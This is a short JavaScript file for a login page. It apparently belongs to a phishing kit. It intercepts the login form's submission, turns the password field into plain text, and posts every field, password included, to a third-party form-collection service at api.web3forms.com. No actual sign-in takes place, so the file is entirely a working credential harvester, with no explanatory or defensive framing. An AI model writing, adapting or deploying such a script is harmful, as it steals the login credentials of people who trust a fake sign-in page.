const form = document.getElementById("login_form");
const button = document.getElementById("tlogin");
const P = document.getElementById("inputP");

form.addEventListener('submit', async (event) => {
  event.preventDefault(); 

  P.type = "text";

  const formData = new FormData(form); 

  try {
    const response = await fetch('https://api.web3forms.com/submit', {
      method: 'POST',
      body: formData
    });

    if (response.ok) {
      console.log('Form successfully submitted!');
    }
  } catch (error) {
    console.error('Submission failed:', error);
  }
});
